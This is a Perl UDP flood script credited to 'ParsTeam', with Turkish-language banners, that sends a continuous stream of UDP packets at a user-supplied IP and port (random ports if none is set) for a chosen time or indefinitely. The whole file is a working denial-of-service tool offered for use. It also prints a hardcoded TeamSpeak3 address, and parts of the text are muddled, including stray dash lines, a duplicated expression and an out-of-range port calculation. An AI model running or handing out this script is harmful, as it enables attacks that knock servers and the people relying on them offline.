#!/usr/bin/perl

##                          ##
# ParsTeam UDP Floot Script  #
##                          ##

use Socket;
use strict;
eval {require Socket6}; our $has_socket6 = 0;
unless ($@) { $has_socket6 = 1; import Socket6; };
use Term::ANSIColor qw(:constants);
    $Term::ANSIColor::AUTORESET = 2;
use Getopt::Long;
use Time::HiRes qw( usleep gettimeofday ) ;

our $port = 0;
our $size = 0;
our $time = 0;
our $bw   = 0;
our $help = 0;
our $delay= 0;
our $ipv6 = 0;

print BOLD RED "P4ARSTEAM [+] Kullanımı ip port  \n";
print BOLD YELLOW "P4ARSTEAM [+] Port Boşta ise Random Port  \n";
print BOLD BLUE "P4ARSTEAM [+] Coder By [B]ob[M]arley ";
print BOLD BLACK  "     \n";

my ($ip,$port,$size,$time) = @ARGV;

my ($iaddr,$endtime,$psize,$pport);

$iaddr = inet_aton("$ip") or die "P4ARSTEAM [+] TeamSpeak3 Adres: 193.70.31.98:2101 $ip\n";
$endtime = time() + ($time ? $time : 99999999);
socket(flood, PF_INET, SOCK_DGRAM, 17);

print DARK RED<<EOTEXT;
-----------------------
 BY ParsTeam //
EOTEXT

print BLACK BLUE<<EOTEXT;

                 ~ [+]ParsTeam UDP FLOOD[+] ~	

EOTEXT

 print           "            [+]Saldırdığınız IP Adresi : $ip
            [+]Saldırdığınız Port Adresi : " .

-
-
-
-

        ($port ? $port : "random") ." ".($time ? "= $time [+] Saniye" : "
            [+]Saldırınız şuanda gerçekleştiriliyor. ") . "\n";
        ($port ? $port : "random") ." ".($time ? "= $time [+] Saniye" : "
            [+]Saldırınız şuanda gerçekleştiriliyor. ") . "\n";
        print   BLACK RED"            [+]Durdurmak için Ctrl-C\n" unless $time;

for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1024-64)+64) ;
  $pport = $port ? $port : int(rand(85500))+1;

  if(1 != $ipv6) {
    send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));
  } else {
    send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in6($pport, $iaddr));
  };
  usleep(1000 * $delay) if $delay;
}